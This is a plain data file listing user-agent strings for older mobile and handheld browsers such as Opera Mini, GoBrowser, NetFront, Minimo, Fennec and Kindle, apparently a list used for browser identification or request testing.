"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a1pre) Gecko/2008071707 Fennec/0.5"
"Mozilla/5.0 (Windows; U; Windows CE 5.2; en-US; rv:1.9.2a1pre) Gecko/20090210 Fennec/0.11"
"NokiaN81/GoBrowser/2.0.290"
"NokiaE72/GoBrowser/2.0.290"
"NokiaC5-00/GoBrowser/2.0.290"
"Nokia6120c/GoBrowser/2.0.290"
"Nokia5320XpressMusic/GoBrowser/2.0.290"
"NokiaN85/GoBrowser/1.6.91"
"NokiaN81/GoBrowser/1.6.91"
"NokiaE72/GoBrowser/1.6.91"
"NokiaC5-00/GoBrowser/1.6.91"
"Nokia6700s/GoBrowser/1.6.91"
"Nokia5700XpressMusic/GoBrowser/1.6.91"
"Nokia5630XpressMusic/GoBrowser/1.6.91"
"Nokia5320XpressMusic/GoBrowser/1.6.91"
"NokiaE66/GoBrowser/2.0.297"
"NokiaN82/GoBrowser/1.6.86"
"NokiaE63/GoBrowser/1.6.86"
"NokiaE5-00/GoBrowser/1.6.86"
"Nokia6220c/GoBrowser/1.6.86"
"Nokia6120c/GoBrowser/1.6.86"
"NokiaN97_mini/GoBrowser/1.6.0.75"
"NokiaN85/GoBrowser/1.6.0.75"
"NokiaN78/GoBrowser/1.6.0.75"
"Nokia5800XpressMusic/GoBrowser/1.6.0.75"
"Nokia5730XpressMusic/GoBrowser/1.6.0.75"
"Nokia5320XpressMusic/GoBrowser/1.6.0.75"
"Nokia5230/GoBrowser/1.6.0.75"
"NokiaN97_mini/GoBrowser/1.6.0.70"
"NokiaN81/GoBrowser/1.6.0.70"
"NokiaN78/GoBrowser/1.6.0.70"
"Nokia6700s/GoBrowser/1.6.0.70"
"Nokia6120c/GoBrowser/1.6.0.70"
"Nokia5320XpressMusic/GoBrowser/1.6.0.70"
"Nokia5230/GoBrowser/1.6.0.70",
"NokiaN86_8MP/GoBrowser/1.6.0.4868.208.92;"
"NokiaN79/GoBrowser/1.6.0.48-cn"
"NokiaN97_mini/GoBrowser/1.6.0.48"
"NokiaN82/GoBrowser/1.6.0.48"
"NokiaN79/GoBrowser/1.6.0.48"
"Nokia6124c/GoBrowser/1.6.0.48"
"Nokia6120c/GoBrowser/1.6.0.48"
"Nokia5530XpressMusic/GoBrowser/1.6.0.48"
"Nokia5320XpressMusic/GoBrowser/1.6.0.48"
"Nokia5800XpressMusic/GoBrowser/1.6.0.46"
"NokiaX6/GoBrowser"
"NokiaN97_mini/GoBrowser"
"NokiaN97/GoBrowser"
"NokiaN95_8GB/GoBrowser"
"NokiaN95/GoBrowser"
"NokiaN86_8MP/GoBrowser"
"NokiaN85/GoBrowser"
"NokiaN82/GoBrowser"
"NokiaN81/GoBrowser"
"NokiaN79/GoBrowser"
"NokiaN70/GoBrowser"
"NokiaC6-00/GoBrowser"
"NokiaC5-00/GoBrowser"
"Nokia6120c/GoBrowser"
"Nokia5800XpressMusic/GoBrowser"
"Nokia5730XpressMusic/GoBrowser"
"Mozilla/5.0 (Android 2.2; zh-cn; HTC Desire)/GoBrowser"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"
"HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)"
"Mozilla/5.0 (Windows NT; U; en) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Iris/1.1.7 Safari/525.20"
"Mozilla/5.0 (X11; U; Linux armv7l; ru-RU; rv:1.9.2.3pre) Gecko/20100723 Firefox/3.5 Maemo Browser 1.7.4.8 RX-51 N900"
"Mozilla/5.0 (X11; U; Linux armv7l; pt-PT; rv:1.9.2.3pre) Gecko/20100723 Firefox/3.5 Maemo Browser 1.7.4.8 RX-51 N900"
"Mozilla/5.0 (X11; U; Linux armv7l; no-NO; rv:1.9.2.3pre) Gecko/20100723 Firefox/3.5 Maemo Browser 1.7.4.8 RX-51 N900"
"MOT-L7/NA.ACR_RB MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"MOT-L7/08.D5.09R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"MOT-L6i/0A.64.19R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"MOT-L6/0A.60.1BR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0"
"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025"
"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.8) Gecko/20071018 Minimo/0.024"
"Mozilla/5.0 (X11; U; Linux armv6l; rv: 1.8.1.5pre) Gecko/20070619 Minimo/0.020"
"Mozilla/5.0 (Windows; Windows; U; Windows NT 5.1; Windows CE 5.2; rv:1.8.1.4pre) Gecko/20070327 Minimo/0.020"
"Mozilla/5.0 (Windows; U; Windows CE 5.2; rv:1.8.1.4pre) Gecko/20070327 Minimo/0.020"
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1.4pre) Gecko/20070327 Minimo/0.020"
"Mozilla/5.0 (X11; U; OpenBSD macppc; rv:1.8.1) Gecko/20070222 Minimo/0.016"
"Mozilla/5.0 (Windows; U; Windows CE 5.2; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007"
"Mozilla/5.0 (Windows; U; Windows CE 4.20; rv:1.8) Gecko/20060215 Minimo/0.013"
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8) Gecko/20060428 Minimo/0.015"
"SAMSUNG-C5212/C5212XDIK1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"MozillaMozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 824x1200;rotate)"
"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 824x1200;rotate)"
"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 824x1200; rotate)"
"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 600x800; rotate)"
"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 1200x824; rotate)"
"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.3 (screen 600x800; rotate)"
"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.3 (screen 1200x824; rotate)"
"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.1 (screen 824x1200; rotate)"
"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 824x1200; rotate)"
"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)"
"Mozilla/4.0 (compatible; Linux 2.6.10) NetFront/3.4 Kindle/1.0 (screen 600x800)"
"SonyEricssonK800c/R8BF Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK530i/R6BA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK530c/R8BA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"SonyEricssonK510c/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"Mozilla/4.0 (compatible; Linux 2.6.10) NetFront/3.3 Kindle/1.0 (screen 600x800)"
"Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.334; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (J2ME/23.377; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (J2ME/22.478; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/9 (Compatible; MSIE:9.0; iPhone; BlackBerry9700; AppleWebKit/24.746; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Android; Opera Mini/7.6.35766/35.5706; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (Android; Opera Mini/7.5.33361/31.1350; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (Android; Opera Mini/7.29530/27.1407; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (iPhone; Opera Mini/7.1.32694/27.1407; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (iPad; Opera Mini/7.1.32694/27.1407; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (Series 60; Opera Mini/7.1.32444/35.5706; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (Series 60; Opera Mini/7.1.32444/35.2883; U; ru) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/35.5706; U; id) Presto/2.8.119 Version/11.10"
"Opera/9.80 (iPhone; Opera Mini/7.0.4/28.2555; U; fr) Presto/2.8.119 Version/11.10"
"Opera/9.80 (Android; Opera Mini/7.0.29952/28.2075; U; es) Presto/2.8.119 Version/11.10"
"Opera/9.80 (Series 60; Opera Mini/6.5.29702/28.2647; U; es) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/6.5.26955/27.1407; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/6.24288/25.729; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (BlackBerry; Opera Mini/6.24209/27.1366; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (Series 60; Opera Mini/6.24096/25.657; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/6.24093/26.1305; U; en) Presto/2.8.119 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/6.24093/25.657; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Series 60; Opera Mini/6.1.25759/25.872; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/6.1.25378/25.677; U; th) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Android; Opera Mini/6.1.25375/25.657; U; es) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Series 60; Opera Mini/6.0.24455/28.2766; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (Android;Opera Mini/6.0.24212/24.746 U;en) Presto/2.5.25 Version/10.5454"
"Opera/9.80 (Series 60; Opera Mini/6.0.24095/24.760; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Series 60; Opera Mini/6.0.24095/24.741; U; zh) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Series 60; Opera Mini/5.1.22784/23.334; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Series 60; Opera Mini/5.1.22784/22.394; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Series 60; Opera Mini/5.1.22784/22.387; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Series 60; Opera Mini/5.1.22783/23.334; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Series 60; Opera Mini/5.1.22783/22.478; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Series 60; Opera Mini/5.1.22783/22.478; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Android; Opera Mini/5.1.22460/23.334; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Android; Opera Mini/5.1.22460/22.478; U; fr) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Android; Opera Mini/5.1.22460/22.414; U; de) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Series 60; Opera Mini/5.1.22396/22.478; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (BlackBerry; Opera Mini/5.1.22303/22.387; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.50 (J2ME/MIDP; Opera Mini/5.1.21965/20.2513; U; en)"
"Opera/9.80 (Windows Mobile; Opera Mini/5.1.21595/25.657; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Windows Mobile; Opera Mini/5.1.21594/22.387; U; ru) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21415/22.387; U; en) Presto/2.5.25 Version/10.54"
"Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30"
"Opera/9.80(J2ME/MIDP; Opera Mini/5.1.21214/22.414; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21214/22.414; U; ro) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21214/22.387; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Android; Opera Mini/5.1.21126/19.892; U; de) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21051/27.1573; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21051/23.377; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21051/20.2477; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.3521/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.3521/22.414; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.3521/18.684; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.20873/19.916; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.19693Mod.by.Handler/23.390; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.19693Mod.by.Handler/18.794; U; id) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.19693/870; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.19683/1278; U; ko) Presto/2.2.0"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741Mod.by.Handler/22.414; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/886; U; id) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/870; U; fr) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/870; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/18.794; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18635Mod.by.Handler/23.377; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (Windows NT 5.1; U; Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18635/1030; U; en) Presto/2.4.15; ru) Presto/2.8.99 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18635/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.17443/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.17443/20.2477; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.17381/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823Mod.by.Handler/22.387; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/870; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.15650/20.2479; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja)Presto/2.4.15"
"Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja)Presto/ 2.4.15"
"Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja) Presto/2.4.15"
"Opera/9.80 (iPhone; Opera Mini/5.0.019802/886; U; ja) Presto/2.4.15"
"Opera/9.80 (iPhone; Opera Mini/5.0.019802/886; U; en) Presto/2.4.15"
"Opera/9.80 (iPhone; Opera Mini/5.0.019802/22.414; U; de) Presto/2.5.25 Version/10.54"
"Opera/9.80 (iPhone; Opera Mini/5.0.019802/18.738; U; en) Presto/2.4.15"
"Opera/9.80 (iPhone; Opera Mini/5.0.0176/764; U; en) Presto/2.4.154.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.0.862 Profile/24.743; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.0.423 Profile/18.684; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.0.351 Profile/22.478; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0/870; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0(Windows; U; Windows NT 5.1; en-US)/23.390; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/24.838; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/22.478; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/23.377; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows NT 6.1; WOW64) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (SymbianOS/24.838; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/24.838; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/24.741; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; xxxx like Mac OS X; en) AppleWebKit/24.838; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/23.405; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/23.377; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (BlackBerry; U; BlackBerry9800; en-GB) AppleWebKit/24.783; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (BlackBerry; U; BlackBerry 9800) AppleWebKit/24.783; U; es) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.33867/35.2883; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.4.Vista/19.916; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.4.29476/27.1573; U; id) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.4.26736/28.2647; U; it) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.4.0.60 (Windows XP)/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.3.24214; iPhone; CPU iPhone OS 4_2_1 like Mac OS X; AppleWebKit/24.783; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.3.24214/27.1407; U; id) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.3.24214 (Windows; U; Windows NT 6.1) AppleWebKit/24.838; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.3.13337/25.657; U; ro) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.24721/30.3316; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.23453/28.2647; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.21465/22.478; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.21465/22.387; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.19634/23.333; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.18887/22.478; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.16320/29.3594; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.16007Mod.by.Handler/23.390; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410QUAIN/22.478; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/23.334; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/23.333; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/22.401; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/20.2485; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/18.678; U; en) Presto/2.4.15"
"Opera/9.60 (J2ME/MIDP;Opera Mini/4.2.15410Mod.by.Handler/503; U; en)Presto/2.2.0"
"Opera/9.50 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/20.2590; U; en)"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410/870; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410/24.899; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410/22.394; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15066/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912mod.By.onome/22.401; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912Mod.by.Handler/24.783; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912Mod.by.Handler/23.377; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912Mod.By.www.9jamusic.cz.cc/22.387; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/870; U; id) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/35.5706; U; id) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/24.746; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/23.334; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/23.333; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/22.394; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14885/20.2485; U; zh) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14881Mod.by.Handler/24.743; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14881Mod.by.Handler/23.317; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14753/20.2485; U; zh) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14409/20.2485; U; zh) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14320/886; U; id) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14320/22.478; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14320/20.2485; U; zh) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13943/20.2485; U; zh) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/22.414; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13400/20.2485; U; zh) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13337.Mod.by.Handler/870; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13337/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13337/870; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13337/19.916; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13265/870; U; ro) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13221/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13221/870; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13057/870; U; ja) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2 19.42.55/19.892; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.18061/27.1407; U; en) Presto/2.8.119 Version/11.10"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.15082/870; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.15082/25.677; U; vi) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.15082/20.2489; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.14287/22.387; U; id) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.13907/21.529; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.13573/20.2485; U; zh) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.12965/19.892; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.1.11321/24.871; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0.8462/22.414; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0.8462/19.916; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0.10247/19.916; U; en) Presto/2.5.25"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0.10031/22.453; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/886; U; en) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/870; U; id) Presto/2.4.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.453; U; en) Presto/2.5.25 Version/10.54"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.401; U; en) Presto/2.5.25 Version/10.54"
